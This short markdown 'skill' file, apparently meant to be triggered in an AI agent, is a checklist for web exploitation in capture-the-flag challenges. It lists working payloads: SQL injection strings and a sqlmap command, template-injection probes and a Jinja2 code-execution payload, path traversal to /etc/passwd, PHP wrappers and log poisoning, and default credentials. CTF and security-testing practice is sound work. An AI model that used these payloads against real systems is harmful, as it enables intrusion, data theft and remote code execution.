# SKILL: CTF Web Exploitation

## Description
Web exploitation checklist for CTF challenges.

## Trigger Phrases
web, sqli, xss, ssrf, ssti, lfi, rfi, injection, ctf

## Methodology

### Quick Wins
1. Check source code, comments, hidden fields
2. Check robots.txt, .git/, .env, backup files (.bak, .old, ~)
3. Try default credentials (admin:admin, admin:password)
4. Check cookies for JWT, base64 encoded data

### SQL Injection
1. Test: `' OR 1=1--`, `" OR 1=1--`, `') OR 1=1--`
2. Union-based: determine column count with ORDER BY
3. Extract data: `UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--`
4. Blind SQLi: time-based `' AND SLEEP(5)--`
5. SQLMap: `sqlmap -u "<url>" --batch --dbs`

### Server-Side Template Injection
1. Test: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`
2. Identify engine from error messages
3. Jinja2 RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
4. Twig, Freemarker, Pebble → engine-specific payloads

### Local File Inclusion
1. Test: `?file=../../../../etc/passwd`
2. PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
3. Log poisoning: inject PHP into access log, include it
4. Null byte: `%00` (older PHP)

### Deserialization
1. PHP: check for `unserialize()` → craft gadget chain
2. Python pickle: `pickle.loads()` → RCE via __reduce__
3. Java: ysoserial gadgets
